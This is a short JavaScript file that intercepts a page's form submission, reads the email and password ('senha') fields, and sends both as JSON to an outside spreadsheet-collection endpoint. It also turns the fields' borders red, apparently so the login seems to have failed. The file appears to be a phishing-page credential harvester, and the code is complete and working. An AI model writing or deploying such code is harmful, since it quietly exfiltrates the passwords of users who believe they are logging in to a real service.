var monkey2=(event)=>{
    event.preventDefault()
    var em=document.getElementById('iemail')
    var sh=document.getElementById('isenha')
    em.style.border='solid 1px red'
    sh.style.border='solid 1px red'

    var email=em.value
    var senha=sh.value



    fetch('https://api.sheetmonkey.io/form/aMg4Fau8yyiKVsRUqCSS8N',{
        method:'post',
        headers:{
            'Content-Type':'application/json'
        },
        body:JSON.stringify({email:email,senha:senha})
    })
}

document.querySelector('form').addEventListener('submit',monkey2)